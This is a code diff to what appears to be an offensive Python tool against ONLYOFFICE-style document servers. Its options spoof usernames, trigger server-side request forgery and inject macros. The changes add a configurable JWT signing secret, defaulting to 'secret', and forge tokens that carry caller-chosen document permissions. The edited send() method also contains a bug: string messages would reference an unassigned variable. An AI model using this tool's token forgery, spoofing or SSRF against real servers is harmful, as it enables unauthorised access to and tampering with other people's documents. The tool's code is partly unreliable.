@@ -124,9 +124,9 @@ class WsClient():
   output=True
   usejwt = False
 
-  def __init__( self, url, docid, platform, username='admin', output=True, disconnect=False, usejwt=False ):
+  def __init__( self, url, docid, platform, username='admin', output=True, disconnect=False, usejwt=False, jwtsecret='secret' ):
     self.usejwt = usejwt
-    self.jwtsecret = 'secret'
+    self.jwtsecret = jwtsecret
     self.output = output
     self.disconnect = disconnect
     self.docid = docid
@@ -165,11 +165,10 @@ class WsClient():
   def send( self, message ):
     if not self.ws.connected: return
     if type( message ) != str:
-      if self.usejwt: message['jwtOpen'] = self.create_jwt()
       # JSON containing JSON string
-      message = json.dumps([json.dumps(message)])
-      print( message )
-    self.ws.send( message )
+      if self.usejwt and message['type'] == 'auth': message['jwtOpen'] = self.create_jwt(message)
+      strmessage = json.dumps([json.dumps(message)])
+    self.ws.send( strmessage )
 
   def recv( self ):
     try:
@@ -233,7 +232,7 @@ class WsClient():
         data = json.loads(msg[1:])
         print(data[1])
         if 'jwt must be provided' in data[1]:
-          self.usejwt = True
+          print('Call again with --usejwt (and --jwtsecret if you know it)')
 
       else:
         if self.output: print("RECV:", msg)
@@ -291,10 +290,10 @@ class WsClient():
       }
     )
 
-  def create_jwt( self ):
-    
-    body = {"width":"100%","height":"100%","type":"desktop","documentType":"word","token":"","document":{"title":"new.docx","url":"https://dsdetest.tk/example/download?fileName=new.docx&useraddress=86.158.182.233","fileType":"docx","key":"86.158.182.233https___dsdetest.tk_example_files_86.158.182.233_new.docx1634914864602","info":{"owner":"Me","uploaded":"Tue Oct 26 2021","favorite":None},"permissions":{"comment":True,"copy":True,"download":True,"edit":True,"print":True,"fillForms":True,"modifyFilter":True,"modifyContentControl":True,"review":True,"reviewGroups":None,"commentGroups":{}}},"editorConfig":{"actionLink":None,"mode":"edit","lang":"en","callbackUrl":"https://dsdetest.tk/example/traY2s_filename=new.docx&useraddress=86.158.182.233","createUrl":"https://dsdetest.tk/example/editor?fileExt=docx&userid=uid-1&type=undefined&lang=en","templates":[{"image":"","title":"Blank","url":"https://dsdetest.tk/example/editor?fileExt=docx&userid=uid-1&type=undefined&lang=en"},{"image":"https://dsdetest.tk/example/images/file_docx.svg","title":"With sample content","url":"https://dsdetest.tk/example/editor?fileExt=docx&userid=uid-1&type=undefined&lang=en&sample=True"}],"user":{"group":"","id":"uid-1","name":"John Smith"},"embedded":{"saveUrl":"https://dsdetest.tk/example/files/86.158.182.233/new.docx","embedUrl":"https://dsdetest.tk/example/files/86.158.182.233/new.docx","shareUrl":"https://dsdetest.tk/example/files/86.158.182.233/new.docx","toolbarDocked":"top"},"customization":{"about":True,"chat":True,"comments":True,"feedback":True,"forcesave":False,"goback":{"url":"https://dsdetest.tk/example/"},"submitForm":True},"fileChoiceUrl":"","plugins":{"pluginsData":[]}},"iat":1635281563,"exp":1635281863}
-    # body = {"document":{"key":self.docid,"permissions":{"comment":True,"copy":True,"download":True,"edit":True,"print":True,"fillForms":True,"modifyFilter":True,"modifyContentControl":True,"review":True,"reviewGroups":None,"commentGroups":{}}},"editorConfig":{"user":{"id":"uid-1","name":self.username,"index":1},"ds_view":False,"ds_isCloseCoAuthoring":False,"ds_denyChangeName":True},"iat":time.time(),"exp":time.time() + 1000}
+  def create_jwt( self, data ):
+    iat = int( time.time() )
+    exp = iat + 1000
+    body = {"document":{"key":self.docid,"permissions":data['permissions']},"editorConfig":{"user":{"id":"uid-1","name":self.username,"index":1},"ds_view":False,"ds_isCloseCoAuthoring":False,"ds_denyChangeName":True},"iat":time.time(),"exp":time.time() + 1000}
     jwtstr = jwt.encode( body, self.jwtsecret, algorithm='HS256' ).decode('utf8')
     return jwtstr
 
@@ -378,6 +377,7 @@ def main():
   parser.add_argument('-d', '--docid', help='id of the document')
   parser.add_argument('-U', '--username', default='admin', help='Username to spoof')
   parser.add_argument('-j', '--usejwt', default=False, action='store_true', help='Send a JWT with requests')
+  parser.add_argument('--jwtsecret', help='Secret string to sign JWTs with', default='secret')
   parser.add_argument('-D', '--docurl', help='Document URL to download to OO cache for the current docid (SSRF, unix: pipes supported)', default='')
   parser.add_argument('-p', '--platform', default='nextcloud', help='What the underlying platform is')
   subparsers = parser.add_subparsers(dest='command')
@@ -455,7 +455,14 @@ def main():
     args.docid = md5(str(time.time()))
     print('NO DOCID SPECIFIED - using "' + args.docid + '"')
 
-  client = WsClient( args.url, args.docid, args.platform, username=args.username, usejwt=args.usejwt )
+  client = WsClient( 
+    args.url, 
+    args.docid, 
+    args.platform, 
+    username=args.username, 
+    usejwt=args.usejwt,
+    jwtsecret=args.jwtsecret
+  )
 
   # Macro injection
   if args.command == 'macro':
